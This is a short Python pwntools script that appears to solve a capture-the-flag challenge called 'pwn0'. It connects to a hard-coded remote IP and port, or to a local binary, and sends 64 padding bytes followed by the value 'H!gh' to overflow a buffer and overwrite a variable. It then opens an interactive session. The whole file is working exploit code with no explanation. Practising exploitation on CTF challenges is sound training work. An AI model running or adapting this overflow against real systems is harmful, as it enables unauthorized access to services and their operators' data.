from pwn import *
def connect(server=1):
	if server:
		return remote("104.154.106.182","1234")
	else:
		return process("./pwn0")

val = "H!gh"
con = connect()

padding = "A"*64
payload = padding + val

con.sendline(payload)
con.interactive()